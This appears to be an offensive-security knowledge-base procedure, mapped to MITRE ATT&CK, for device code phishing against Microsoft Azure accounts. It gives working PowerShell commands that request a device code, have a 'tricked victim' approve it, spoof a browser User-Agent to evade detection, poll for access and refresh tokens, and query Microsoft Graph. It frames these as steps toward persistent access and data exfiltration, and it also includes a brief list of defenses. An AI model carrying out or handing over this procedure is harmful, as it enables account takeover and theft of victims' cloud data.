---
type: procedure
verified: true
submitted: true
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques:
  - '[[techniques/Valid Accounts/Cloud Accounts|T1078.004 - Cloud Accounts]]'
platforms:
  - Cloud
  - Azure
tags:
  - powershell
  - azure
  - graph-api
  - device-code-flow
  - oauth
  - authentication
  - refresh-token
commands:
  - '[[commands/powershell-request-device-code-for-microsoft-graph-api]]'
  - '[[commands/powershell-request-token-using-device-code-graph-api]]'
  - '[[commands/powershell-query-graph-api-with-access-token]]'
tools: []
validated: true
---

# Device-Code-Flow-Authentication-to-Microsoft-Graph-API-in-PowerShell

## Summary

This procedure outlines the steps to authenticate to the Microsoft Graph API in PowerShell using the OAuth 2.0 device code flow. This flow is ideal for environments where interactive browser callbacks are not feasible, such as command-line tools or compromised systems without GUI. It initiates authentication by generating a device code, prompts the user (or tricked victim) to authenticate via a separate browser, polls for approval, and obtains an access token along with a refresh token for subsequent API calls. Attackers can leverage this to access sensitive Azure resources like emails, files, and user profiles.

## Description

The device code flow is part of Microsoft's OAuth 2.0 implementation for public clients without client secrets. It starts with a request to the authorization server for a device code and user code. The user visits a verification URI (e.g., microsoft.com/devicelogin) and enters the code to approve access. Meanwhile, the client polls the token endpoint until the user approves or the code expires. Upon success, it receives short-lived access tokens and long-lived refresh tokens. In an offensive scenario, an attacker might phish a user to complete the authentication on their behalf or use it on a compromised machine to gain persistent API access. This procedure uses the public client ID for Microsoft Graph PowerShell and v1.0 endpoints for compatibility. Prerequisites include network access to login.microsoftonline.com and graph.microsoft.com. Expected outcomes include valid tokens enabling Graph API queries, with the refresh token allowing token renewal without re-authentication.

## Requirements

1. PowerShell 5.1 or later installed on the attacker's or compromised machine.
2. Network connectivity to Azure endpoints (login.microsoftonline.com and graph.microsoft.com) without proxy restrictions.
3. A valid Azure app registration client ID with delegated permissions for Microsoft Graph (e.g., User.Read); the procedure uses the public client ID 1950a258-227b-4e31-a9cf-717495945fc2 for Microsoft Graph PowerShell, which supports common scopes like https://graph.microsoft.com.
4. Ability to prompt or trick the target user into completing authentication at the verification URI.

## Defense

- Enable multi-factor authentication (MFA) and conditional access policies in Azure AD to block suspicious device code authentications from unknown locations or devices.
- Monitor Azure AD sign-in logs for device code flow usage, unusual user agents, or high-frequency polling from the same IP.
- Limit app permissions to least privilege and regularly rotate refresh tokens; implement token revocation on suspicion.
- Deploy endpoint detection rules for PowerShell scripts making HTTPS requests to OAuth endpoints with obfuscated user agents.
- Use Azure Sentinel or similar SIEM to alert on Graph API access from non-approved clients.

## Objectives

1. Initiate the device code flow to generate authentication codes without browser interaction on the client side.
2. Obtain access and refresh tokens after user approval to enable API interactions with Microsoft Graph.
3. Verify successful authentication by querying user data via the Graph API.
4. Establish persistent access using the refresh token for future operations without repeated user interaction.

## Instructions

### Step 1: Request Device Code

**Context**: This step initiates the OAuth device code flow by sending a POST request to the authorization endpoint. It generates a unique device code, user code, and verification URI. The why: This avoids the need for a local web server or browser redirect, making it suitable for headless or compromised environments. Replace placeholders with your values; the default client ID is public for Graph access.

**Command** ([[commands/powershell-request-device-code-for-microsoft-graph-api]]):
```powershell
$body = @{
    "client_id" = "$_CLIENT_ID"
    "resource" = "$_RESOURCE"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers = @{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
```

> This command sets up the request body with client details and invokes the REST method. Use $_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2" and $_RESOURCE = "https://graph.microsoft.com". The obfuscated User-Agent mimics a browser to evade basic detection.

**Expected Output**: A PowerShell object ($authResponse) containing authentication details, such as:

```json
{
  "device_code": "GMh6y...",
  "user_code": "ABCD-EFGH",
  "verification_uri": "https://microsoft.com/devicelogin",
  "expires_in": 900,
  "interval": 5,
  "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABCDEFGHI to authenticate."
}
```

Display the verification_uri and user_code to the target user (e.g., via social engineering or on-screen prompt). The code expires in 15 minutes (900 seconds).

### Step 2: Poll for Authorization Approval

**Context**: After the user authenticates at the verification URI, poll the token endpoint to retrieve the granted tokens. This step handles the waiting period by repeatedly requesting tokens until approval or expiration. The why: The authorization server holds the request until the user completes login; polling ensures you capture the tokens promptly. Implement a loop in PowerShell, calling the poll command at the specified interval (typically 5 seconds) to avoid rate limiting.

**Command** ([[commands/powershell-request-token-using-device-code-graph-api]]):
```powershell
$body = @{
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "client_id" = "$_CLIENT_ID"
    "device_code" = "$_DEVICE_CODE"
    "resource" = "$_RESOURCE"
}
$Headers = @{"User-Agent" = "$_USER_AGENT"}
$tokenResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/token" `
    -Headers $Headers `
    -Body $body -ContentType "application/x-www-form-urlencoded"
```

> Invoke this command in a loop: Calculate $expiresAt = (Get-Date).AddSeconds($authResponse.expires_in); while ((Get-Date) -lt $expiresAt) { run command with $_DEVICE_CODE = $authResponse.device_code, $_CLIENT_ID and $_RESOURCE as before, $_USER_AGENT = the browser string; if ($tokenResponse.access_token) { break; } Start-Sleep -Seconds $authResponse.interval }. Use the same User-Agent for consistency.

**Expected Output**: On success, a PowerShell object ($tokenResponse) with tokens:

```json
{
  "token_type": "Bearer",
  "access_token": "eyJ0eXAiOiJKV1QiLCJub25jZSI6...",
  "refresh_token": "0.ATMA1ua...",
  "expires_in": 3599,
  "scope": "https://graph.microsoft.com/User.Read"
}
```

If pending: {"error":"authorization_pending"}. If expired: {"error":"expired_token"}. Store $tokenResponse.refresh_token securely for renewal.

### Step 3: Verify Authentication with Graph API Query

**Context**: Use the obtained access token to make an API call to confirm authentication and access level. This tests the token's validity and scopes. The why: Ensures the tokens work for intended operations like data exfiltration; also reveals user context (e.g., account details). Common endpoint: /v1.0/me for current user profile.

**Command** ([[commands/powershell-query-graph-api-with-access-token]]):
```powershell
$headers = @{
    "Authorization" = "Bearer $_ACCESS_TOKEN"
    "User-Agent" = "$_USER_AGENT"
}
$response = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Get `
    -Uri "$_GRAPH_ENDPOINT" `
    -Headers $headers
```

> Run with $_ACCESS_TOKEN = $tokenResponse.access_token, $_GRAPH_ENDPOINT = "https://graph.microsoft.com/v1.0/me", $_USER_AGENT = the browser string. This queries the user's profile.

**Expected Output**: JSON response with user data, e.g.:

```json
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "id": "user-guid",
  "displayName": "John Doe",
  "mail": "john.doe@company.com",
  "userPrincipalName": "john.doe@company.com"
}
```

Success criteria: No 401 Unauthorized error; valid user data returned. If scopes are insufficient, adjust app permissions and retry flow.
